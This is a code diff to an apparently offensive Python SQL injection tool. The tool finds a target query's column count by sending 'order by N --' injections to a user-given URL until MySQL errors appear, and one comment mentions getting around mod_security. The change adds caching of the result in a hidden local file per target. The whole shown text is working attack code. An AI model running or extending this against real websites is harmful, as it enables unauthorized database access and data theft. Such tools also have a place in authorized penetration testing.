@@ -94,8 +94,22 @@ class sqli():
         print("\033[01;32m[+]\033[0;0m\033[01;39mDiscovering number of columns\033[0;0m")
         request = ""
         self.num = 1
-
+        self.fncexiste = False
         while not "warning: mysql" in request.lower() and not "unknown column" in request.lower():
+
+            self.url = self.args.u.lower().replace("http://", "")
+            self.url = self.url.replace("https://", "")
+            self.url = self.url.replace("www.", "www").replace("/", "-")
+            self.url = f".num-columns-{self.url}"
+
+            open(self.url, "a").write(" ")
+            file = open(self.url, "r")
+            texto = file.read().replace(" ", "")
+            if texto != "":
+                self.fncexiste = True
+                self.num = int(texto)
+                break
+
             try:
                 request = requests.get(f"{self.args.u} order by {self.num} --").text
                 # tirar mod_security
@@ -104,10 +118,13 @@ class sqli():
                 exit()
             except:
                 None
-
             sleep(0.01)
             self.num += 1
-        self.num -= 2
+        if not self.fncexiste:
+            self.num -= 2
+        file = open(self.url, "w")
+        file.write(str(self.num))
+        file.close()
         print(f"\033[01;32m[+]\033[0;0m\033[01;39m{self.num} columns\033[0;0m")
 
 
